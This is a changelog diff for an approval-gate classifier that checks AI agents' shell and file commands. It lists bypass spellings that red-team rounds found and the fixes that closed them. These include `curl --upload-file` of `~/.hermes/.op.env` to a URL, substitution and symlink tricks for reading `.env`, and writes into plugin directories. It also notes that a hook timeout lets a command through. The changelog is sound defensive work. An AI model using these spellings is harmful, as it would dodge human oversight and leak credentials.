@@ -311,9 +311,10 @@ on the hook for enforcement.
   does, never answering milder than before, and only the bare word `git`
   counts as git for the earlier-segment list and the judges (`./git
   status && …` is shared).
-- Conformance: `command-class` 1.9.0, thirty-seven new `rewrite-*` vectors,
-  and `schema-validation` 3.5.0, seven new `payload.history_rewrite` fixtures
-  (3.4.0 went to APRV-510 at merge); no existing expectation moved.
+- Conformance: `command-class` 1.10.0, thirty-seven new `rewrite-*` vectors
+  (1.9.0 went to APRV-511 at merge), and `schema-validation` 3.5.0, seven new
+  `payload.history_rewrite` fixtures (3.4.0 went to APRV-510 at merge); no
+  existing expectation moved.
 
 ### Harnesses
 
@@ -340,6 +341,191 @@ on the hook for enforcement.
   unchanged (942 paths), because `judgy/` was never in the `files` list;
   `docs/README-extended.md`, which ships in the package, drops judgy from its
   directory table.
+
+### The Hermes home's other organs (APRV-511; 0.4.6 candidate)
+
+- **Security: `hermes-agent/`, `plugins/` and `.op.env` are organs.** On an
+  Agent Village box the agent's uid owns the whole Hermes home, and a write
+  under `$HERMES_HOME/hermes-agent/` (the runtime's source install, whose
+  `.env` Hermes loads into the gateway), `$HERMES_HOME/plugins/` (where the
+  gate's own `av-approval` plugin and its `custody_keys.json` load from) or onto
+  `$HERMES_HOME/.op.env` was `files.write.workspace`, autonomous under the
+  village template. Each is now `policy.core`, by every tool (`write_file`,
+  `patch`, redirections, `sed -i`, `tee`, `cp`, `mv`, `rm`, `chmod`); a read of
+  `.op.env` or `hermes-agent/.env` is `account.credential`. Reads of the
+  runtime's source keep their class.
+- **Security: the `hermes` verbs that rewrite an organ are `policy.core`**
+  (rule `hermes-organ-write`): `plugins install|update|remove|enable|disable`,
+  `plugins pack install`, bare `plugins`, `config set|unset|edit|migrate`,
+  `hooks revoke`, `update`, `uninstall`. A help flag keeps the launch class
+  only as a flag of its own, never after `--` or as a possible flag value.
+- **Security: `$HERMES_HOME` is the home without a disk pass.** `approval hook
+  classify`, Claude Code and Cursor read `>> $HERMES_HOME/config.yaml` as a
+  workspace write; the pure classifier now reads `$HERMES_HOME` and
+  `${HERMES_HOME}` as the home, any other variable segment as possibly the
+  home (organ and credential rows only), the home's names without case, and a
+  `..` below the home resolved. The Hermes hook already expanded the variable.
+- **Security: where a write lands.** A file tool's write is judged at its
+  realpath as well as its spelling (a symlink into the home, a `..` out of a
+  directory under it), for every adapter; in the Hermes disk pass a glob into
+  any `policy.core` directory, a pattern naming an organ directory, and a
+  variable the hook cannot expand that decides the directory are `policy.core`.
+- **Security (refuter round 1): one-call spellings the lexer hid.** A `$(…)`
+  in a path word now stands for an unexpanded variable instead of vanishing
+  (`echo x > $(echo ~/.hermes)/plugins/…`, `cat $(echo ~/.hermes)/.env`,
+  `> $(pwd)/../plugins/…`); an unquoted brace group is expanded and judged per
+  word (`tee ~/.hermes/plugin{s,s}/…`, `cat ~/.hermes/.op.en{v,v}`); `curl -o`,
+  `--output`, `-O`, `--output-dir` and `wget -O`, `--output-document`, `-P` and
+  wget's default name are write targets; GNU `cp -t<dir>` names its
+  destination; `ln` and `cp -s`/`cp -l` whose SOURCE is an organ or a
+  credential plant a handle on it and take its class; and under the Hermes
+  hook a side-effecting command run from inside `hermes-agent/`, `plugins/` or
+  another `policy.core` directory (`git pull`, `git apply`, `npm install`,
+  `git clone`), or a `git --work-tree`/`--git-dir` naming one, is
+  `policy.core`. All of these were allowed on 0.4.3 as well. An unmatched
+  brace is literal, as in bash, and a word whose only distance from an organ
+  or a credential is a stray brace is judged as that organ. curl and wget
+  long options match by unique prefix and every short cluster is parsed; a
+  download carrying an option the table does not know, an ambiguous prefix,
+  or a config source (`curl -K`/`--config`, `wget -e`/`--execute`/`--config`)
+  is `policy.core` (rule `fetch-output-unknown`): its output cannot be known.
+  `curl --method PUT` (not a curl option) moves from `network.call` to that
+  class.
+- **Security (refuter recheck): the rest of the spellings.** A brace sequence
+  that collapses to one word (`plugin{s..s}`, `.op.en{v..v}`,
+  `config.yam{l..l}`) is judged as that word in the pure classifier and the
+  Hermes disk pass. The brace expander is iterative and bounded (256 words,
+  1,024 expansions, a linear group scan); a word past either bound is the
+  stricter class instead of a stack overflow (`hook-io`). Every file curl
+  writes by option is a write target: `-o` joined onto `--output-dir`,
+  `-D`/`--dump-header`, `-c`/`--cookie-jar`, `--trace`, `--trace-ascii`,
+  `--libcurl`, `--etag-save`, `--stderr`, `--hsts`, `--alt-svc`, and each
+  `-w '%output{FILE}'`; wget's `-o`, `-a`, `--output-file`. An output whose
+  value is absent, a variable or a substitution (`curl -o "$OUT"`), or a `-w
+  @FILE` format, is `policy.core` (`fetch-output-unknown`). `cp`, `mv`, `ln`
+  and `install` read `-t` anywhere in a short cluster (`-vt<dir>`,
+  `-rt<dir>`) and `--target-directory` by any unique prefix
+  (`--target-dir=`).
+- **Behavior change:** under the Hermes hook, every write whose directory or
+  leading name an unexpandable variable decides is now `policy.core`, which the
+  village template holds human-only, so the agent cannot run it at all:
+  `mkdir -p "$OUT"`, `> "$OUT/x"`, `> "$TMPDIR/x"`, `> /tmp/$NAME.txt` and
+  `> "$f"` from the workspace (recheck 3 had allowed them outside the home's
+  own directories). In every adapter's pure classifier, a variable or
+  substitution path whose rest names an organ or a credential (`$PWD/plugins/x`,
+  `$REPO/config.yaml`, `$GIT_DIR/hooks/pre-commit`, `$DIST/.env`) is
+  `policy.core` (or `account.credential` to read); `cp x
+  $HERMES_HOME/.env` moves from `policy.core` to `account.credential` (the
+  answer `~/.hermes/.env` already had), refused either way. No answer moves to
+  a looser class.
+- **Security (fix round 3, after the second recheck): a symlink then `..`, and
+  the download/copy family closed by rule.** Node's `realpath` cancels `..`
+  before it reads a link, so `ln -s ~/.hermes/skills k && cat k/../.op.env`
+  and `write_file <ws>/p/../plugins/…` were judged beside `k`, not where the
+  kernel lands. The Hermes disk pass and the file tools now also resolve each
+  path component by component as the kernel does, and the stricter answer
+  wins; a `..` out of something an earlier segment of the same command writes,
+  links, moves, deletes or extracts into, or after a program whose file
+  effects the pass does not model, or through `/proc/<pid>/cwd`, is
+  `policy.core` to write and `account.credential` to read. A `curl`, `wget`,
+  `cp`, `mv`, `ln` or `install` argv word the shell may still turn into an
+  option (an unquoted variable or `$(…)`, a variable at a word's head quoted or
+  not, an unquoted glob at its head, a brace group making a word that begins
+  with `-`) makes the write target unknown: `policy.core`
+  (`fetch-output-unknown`, new `copy-target-unknown`) unless it follows `--`.
+  A curl or wget output holding `#<digit>` (curl's URL-glob fill) is unknown
+  too, and `--output-dir` joins onto an absolute `-o`. A brace word over the
+  cap whose every group is plain numbers (`echo {1..300}`, `touch f{1..300}`)
+  is judged by its first word instead of refusing as a credential read; a
+  letter product (`ls {a..z}{a..z}`) keeps the stricter class.
+- **Behavior change (fix round 3):** `cp "$f" bak/`, `mv $tmp out`, `cp *.md
+  docs/`, `curl "$URL"`, `curl -u $U:$P …` and `curl 'https://e/{a,b}' -o
+  'out_#1'` are now `policy.core` in every adapter; `cp -- "$f" bak/`, `cp
+  ./*.md docs/`, `curl -- "$URL"` and a quoted value keep their class. Under the
+  Hermes hook a `..` out of a directory the same command made (`mkdir -p d &&
+  cat d/../x`) is judged as a credential read. Nothing moves looser than 0.4.4.
+- **Rebased over 0.4.4.** A `$(…)` in a word now leaves an unexpanded-variable
+  sentinel, so a `>&` target made only of substitutions (`date >&$(ls)`) is
+  kept at 0.4.4's `unparseable` refusal rather than read as a file; and a
+  `$(…)` glued before a binary's name (`(( $(ls)date ))`, `a=($(ls)rm)`) is
+  part of the command word, so it no longer reads as `date` or `rm` and is
+  refused `unclassified`; and a `$(…)` that decides a `date` assignment's
+  value (`TZ="$(cat .tz)" date`, `LANG=$(cat .l) date`) is refused as `TZ=$X
+  date` always was, since the output could name a zone file. All only ever
+  stricter than 0.4.4.
+- **Security (fix round 4, M(L5f-1)): the file an upload reads, in every
+  spelling.** The file a `curl` or `wget` upload or request-body option reads
+  was judged only when it was a word of its own, so `curl
+  --upload-file=~/.hermes/.op.env URL`, `-T<file>`, `--data=@<file>`,
+  `--data-binary=@<file>`, `wget --post-file=<file>`, `--body-file=<file>` and
+  `--input-file=<file>` sent a credential as `network.call`. The value
+  embedded in the option word (`--opt=value`, `-Tvalue`, `-sd@value`,
+  `-Ff=@value`, wget's options by unique prefix) is now judged as the
+  separated value is, and the file after `@` or `<` is judged on its own in
+  either spelling (`curl -F f=@.hermes/.env`, `--data @.approval/env`, `-F
+  'f=@<file>;type=…'`): a credential file is `account.credential` and an
+  organ its own class. An embedded value whose file the text cannot read (a
+  variable, a substitution, a glob or a brace in it, or a variable where the
+  `@` would be: `--upload-file="$F"`, `--data="$BODY"`) is
+  `account.credential`; the separated `-T "$F"` and `-d "$BODY"` keep
+  `network.call`. A download output that outranks the credential class keeps
+  `policy.core`. Only ever stricter than 8f954b62.
+- **Security (fix round 5, the last): a relative upload source under the
+  Hermes hook.** The hook's disk pass judged operands as reads only for read
+  segments, so `curl -T ../.op.env URL` from the workspace, `curl --data
+  @.op.env URL` or `curl -T plugins/av-approval/_custody.py URL` from the home
+  sent the file as `network.call` while `cat ../.op.env` was refused. Each file
+  an upload or body option reads (`-T`, `-d @`, `-F f=@`, `--data-urlencode
+  name@`, `wget --post-file`/`--body-file`/`-i`) is now judged as the read it
+  is: resolved after `cd` and `~`, through symlinks and `..` by the same
+  landing helpers, a credential `account.credential`, an organ or protected
+  path its class, and a file outside the read scope `read.file.out_of_scope`.
+  Only ever stricter than 84856f9f; the pure classifier is unchanged.
+- **Security (cred-asymmetry): an unresolved read word under the Hermes
+  hook.** The `$(…)` sentinel left a read word the disk pass could not expand,
+  and the pass returned with no class, so a git reader (exempt from the text
+  credential rule) of `$(…)/.hermes/.env` read as `read.shell`. Such a word is
+  now judged by what it spells, and `account.credential` when it could name a
+  credential. A RECURSIVE reader (`grep`, `rg`, `find`, `tar`, `du`, a copy,
+  move or sync source) of an unresolved word is `account.credential` outright,
+  because the word may land on or above a home, a profile home or an approval
+  home; so is a recursive reader of a pattern the hook cannot expand, and one
+  whose pattern matches a directory holding credentials. Round 3 (review-b's
+  read at 05eb9720): the unresolved-word judge now drops `.` and resolves
+  `..` before it looks for a literal home, counts a home's (or a profile
+  home's) `hermes-agent/` as one, and treats two unknown segments in a row at
+  the end as a possible credential; it also lands the word's literal prefix
+  from each working directory, so a relative, `cd`'d or symlinked prefix into
+  a home is judged where it lands. Bash's `~+` is read as the working
+  directory, and `~-`, the directory-stack forms and `~name` as unknown. A
+  recursive reader that names no path (`grep -r P`, `rg P`, `find -type f`)
+  has its working directory judged as the operand. Cost: `grep`, `rg` and
+  `find` count as recursive whatever their flags, so any operand of theirs
+  holding a `$` (a variable pattern, a `$` regex anchor, single-quoted or not,
+  in a single-file search too) now goes to a person, and so does a single-file
+  read ending in two unexpanded segments (`cat "$DIR/$F"`). Only ever stricter.
+  Since the merge of APRV-522 (#653), every unexpanded tilde prefix, `~+`
+  included, fails closed instead. Fix round 4 (review-b's read at 305d7c3c):
+  the unresolved-word judge also reads a `..` right after an unexpanded
+  segment as cancelling it, which is its own one-segment model, so a round
+  trip through a span back to a home's `profiles/` is judged where it lands;
+  the walk test reads a short option it does not know (and ripgrep's
+  one-letter maximum-depth option) as taking the next word, as it already
+  read an unknown long option; and a pattern in the `hermes-agent/` or
+  `profiles/` directory component under a home, before a credential, is a
+  credential read where the hook cannot list the home. Only ever stricter.
+  Fix round 5 (review-b's read at cbeaf709, M1): that pattern test judges
+  each combination of directory patterns once, in a loop, where round 4
+  recursed with no bound (work factorial in the count of such patterns, and
+  a hook stopped by its harness's timeout lets the call through on Claude
+  Code); a word with more than four such patterns is a credential read
+  without being judged, so it fails closed.
+- **Conformance.** `command-class` 1.9.0 (one hundred and forty new
+  vectors, thirty-two of them unmoved controls; no existing vector
+  expectation moved, 0.4.4's 1.7.0 set and APRV-517's 1.8.0 `push-*` set
+  included; one 0.4.4 test row, `TZ="$(cat .tz)" date`, tightened, see the
+  rebase bullet). Totals 896/896.
+  SPEC.md §5.2's organ list amended, pending sign-off.
 
 ## 0.4.5 — 2026-10-17
 
